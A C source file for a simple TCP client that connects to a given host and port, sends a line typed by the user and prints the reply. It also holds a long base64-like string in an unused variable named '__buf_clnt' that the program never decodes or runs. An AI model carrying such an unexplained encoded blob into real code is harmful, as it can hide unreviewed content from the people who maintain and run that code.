#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

void error(const char *msg)
{
    perror(msg);
    exit(0);
}

int main(int argc, char *argv[])
{
    int sockfd, portno, n;
    struct sockaddr_in serv_addr;
    struct hostent *server;

    char buffer[256];
    char __buf_clnt[] = "GVh5S4bPY896fZZNGxiY4LJ2RT27YUGW95ncatZEjEZs9e+Zkga1YeznASFbWKocNByyD2NK6d9r80II3ypzXZgL9cKCWVj5+8zG1vv5Xysc6+bT6GbdX7SGXRD+N1jA5JzbXhbJ9T8G2lZ9Q53g40vtyGMAAdmQiPysVBsMW8RURFWwxxpA1dWrkCxWrEiGos0mgnPw80Sthy/CDcBjRKoAQqwAJVVYN7Ce9pfSFJDIzNyYOoEWiQWAMvsJ1TCcDv/5mOFz/EAlMM3rrLGQRObwZmRZFCd4J9nNW4n3/iG8FEQsNTzWbzy38xoLBZl3w/WAFWcKaRUurDfK/3jFWRsB8eEruWapoQ/RoTAz8kx3ox50Jl2Vb/M/0yyrJgljdkiZAsVD+kFL/HgjQ5MJ+5SyBczhtrJzgYkhs9OIvKI1x/LaAOGeJByoY1zHVSlm1ORQllTrmGmBQzt3DfHGPNUW0SoxqCRbdiOULIG2wFaqy10GHVmgIViloDoHF8yFAU/vh3JKBzfbYpyqYp0YZlRCJ/ccCpOVilWkXRAO+59DPjjYx0q/PvQh2HjSIikgzyYhQyJTfaxSTcwEQuU/+rFxF9Omwey4mbPIC6xdOfmrn/sha4QicMfESLsePr7sEozkBXi8Gn+4tPgwXpQ1HKFrhNmIzzsIXdfqY5OrxU8=";
    if (argc < 3) {
       fprintf(stderr,"usage %s hostname port\n", argv[0]);
       exit(0);
    }
    portno = atoi(argv[2]);
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) 
        error("ERROR opening socket");
    server = gethostbyname(argv[1]);
    if (server == NULL) {
        fprintf(stderr,"ERROR, no such host\n");
        exit(0);
    }
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, 
         (char *)&serv_addr.sin_addr.s_addr,
         server->h_length);
    serv_addr.sin_port = htons(portno);
    if (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) 
        error("ERROR connecting");
    printf("Please enter the message: ");
    bzero(buffer,256);
    fgets(buffer,255,stdin);
    n = write(sockfd,buffer,strlen(buffer));
    if (n < 0) 
         error("ERROR writing to socket");
    bzero(buffer,256);
    n = read(sockfd,buffer,255);
    if (n < 0) 
         error("ERROR reading from socket");
    printf("%s\n",buffer);
    close(sockfd);
    return 0;
}
